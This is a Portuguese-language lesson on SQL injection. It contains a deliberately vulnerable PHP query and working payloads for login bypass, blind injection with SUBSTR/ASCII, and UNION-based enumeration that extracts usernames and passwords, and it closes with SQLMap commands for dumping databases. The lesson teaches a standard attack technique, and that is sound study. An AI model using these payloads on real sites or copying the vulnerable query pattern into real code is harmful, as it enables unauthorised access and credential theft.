# O que é SQL Injection

Um ataque de SQL Injection consiste em injetar comandos em uma consulta SQL. Um exploit de SQL Injection bem sucedido pode ler dados do banco de dados, modificar dados do banco de dados, executar comandos administrativos no banco de dados e até executar comandos no sistema operacional

## Fundamentos de SQL

SQL é uma linguagem usada na programação para interagir com banco de dados. É uma linguagem extremamente útil para organizar dados estruturais. Infelizmente, isso sempre vem com uma desvantagem, uma configuração errada no banco de dados SQL pode significar a uma possível sql injection

Não vamos entrar em muitos detalhes agora, vamos apenas falar o necessário para essa aula

Normalmente, em um ataque SQL injection usamos 4 comando especificos: SELECT, FROM, WHERE e UNION

## Comandos SQL

| Comando | Descrição |
|---------|-----------|
| `SELECT` | Usado para selecionar dados de um banco de dados. |
| `FROM` | Usado para especificar de qual tabela selecionar ou deletar dados. |
| `WHERE` | Usado para extrair apenas os registros que cumprem uma condição específica. |
| `UNION` | Usado para combinar o conjunto de resultados de duas ou mais instruções `SELECT`. |

É importante mencionar que em SQL 1 = 1 significa verdadeiro (já já você vai entender a importância disso)

## Como funciona um ataque SQL

SQL é realizado através de um abuso de um parametro php GET (Por exemplo ?username= ou ?id=)
na url da página. Abaixo temos um exemplo de um campo de entrada de nome de usuário em php:

```php
<?php
$username = $_GET["username"];
$result = mysql_query("SELECT * FROM users WHERE username='$username'")
?>
```
Na primeira linha temos uma variável que pega o parametro username do formulário get
Na segunda linha o sql seleciona todos os usuários com o usuário fornecido. Exatamente isso pode ser explorado

Se um usuário mal intencioda colocar uma marca de citação '(ou aspa) como entrada, o código sql fica assim

```sql
SELECT * FROM users WHERE username='''
```

Essa marca gera um erro, e esse erro é usado para explorar a injeção

No geral, a injeção sql é um ataque para quebrar a lógica do código sql, injetar o seu e depois "consertar" a parte quebrada com comentários no final

![SQLinjection](/content/sqlInjection.png)

os comentários mais usados para payloads de SQLi são:
`--+`
`//`
`/*`

Uma das utilidades da injeção SQL é o bypass de login. Ele permite que o atacante acesse QUALQUER conta, desde que ele saiba o nome de usuário e a senha (normalmente ele só saberá o usuário)

Para consultar o SQL para verificar se o usuário e a senha existem, usamos:

`SELECT username, password FROM users WHERE username='$username' and password='$password'`

se usarmos `' or true --` no campo de usuário a consulta fica: 

`SELECT username, password FROM users WHERE username='' or true -- and password=''`

o `--` comentou a verificação de senha, fazendo com que a aplicação não considere aquela parte do códgio. Esse truque permite que você faça acesso em qualquer conta só com o usuário e payload 

Alguns sites podem usar consultas diferentes, como:

`SELECT username, pass FROM users WHERE username=('$username') and password=('$password')`

Nesse caso, você precisa adicionar um parentese único ao payload: `') or true --` para funcionar

### Blind SQL Injection

Em alguns casos, os desenvolvedores usam o cérebro para anular qualquer erro. Infelizmente, isso torna impossível o ataque anterior

Blind SQL injection se baseia em mudanças em uma aplicação durante um ataque. Ou seja, um erro que pode ser detectado de outras formas, como conteúdo alterado ou outra mudança na página

Com base nisso, o atacante pode adivinhar o nome do banco de dados, ler colunas e etc. Blind SQLi leva mais tempo do que outros tipos, mas pode ser o mais comum

Primeiro você encontra uma maneira de encontrar um erro e consertando

![Blind SQL error](/content/BlindSQLierror.png)

E depois é só quebrar:

![Blind SQLi You are in](/content/BlindSQLiyai.png)

A aplicação não exibiu nenhum erro, mesmo que eu tenha claramente causado um erro

Para fazer as perguntas, você pode usar a função `SUBSTR()`. 

`substr((select database(),1,1)) = 115`

O código acima pergunta ao database se a primeira letra do seu nome começa com 115 ('s' na tabela ASCII)

agora coloque isso em um payload:

`?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+`

O payload é a pergunta, se a aplicação não produz mudança, a resposta é sim, a primeira letra do banco de dados é "s", qualquer erro ou mudança significa não

![](/content/BSqli.png)

### SQL Injection com UNION

Injeção SQL com UNION normalmente é usada para enumeração rápida do banco de dados, já que o UNION combina resultados de mais de um SELECT de uma vez

O ataque de SQLi UNION se divide em 3 partes:

1. Encontrar o número de colunas
2. Verificar se as colunas são adequadas
3. Atacar e roubar dados úteis

#### 1. Determinar o número de colunas com UNION

Existem duas maneiras de completar o primeiro passo

A primeira é injetando consultas ORDER BY até que um erro ocorra:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
E assim por diante, até receber um erro (o último valor antes do erro é o número de colunas)

A segunda envolve enviar payloads UNION SELECT com valores NULL

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--
```

assim por diante, até o erro

#### 2. Encontrar colunas com tipos de dados úteis com UNION

Geralmente, dados que você precisa vão estar em formato de string. Tendo o número de colunas, você pode testar cada coluna para verificar se ela contém dados do formato string substituindo o payload UNION SELECT com um valor String:

```sql
' UNION SELECT "a",NULL,NULL--
' UNION SELECT NULL,"a",NULL--
' UNION SELECT NULL,NULL,"a"--
```

Sem erro = o formato da coluna é string

#### 3. Usando um ataque com UNION para recuperar dados

Tendo o número de colunas e quais colunas contém dados úteis, você pode capturar os dados

Supondo que temos 2 colunas úteis e uma tabela chamada users com as colunas username e password

`UNION SELECT username, password FROM users --`

## SQLMap

SQLMap é uma ferramenta de código aberto para automatizar e explorar falhas de SQLi e tomada de controle em servidores de banco de dados. ela pode ser instalada usando o git:

`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`

Algumas das principais opções do SQLMap são:

```
--url	Fornece a URL para o ataque
--dbms	Informa ao SQLMap o tipo de banco de dados que está em execução
--dump	Copia os dados dentro do banco de dados que a aplicação usa
--dump-all	Copia TODO o banco de dados
--batch	O SQLMap será executado automaticamente e não solicitará entrada do usuário
```

Exemplo de ataque SQLMap:

`sqlmap --url <exemplo.com/login.php> --tables --columns`

onde:
--url - define a url a ser atacada
--tables - copia as tabelas do banco de dados
--columns - copia as colunas do banco de dados

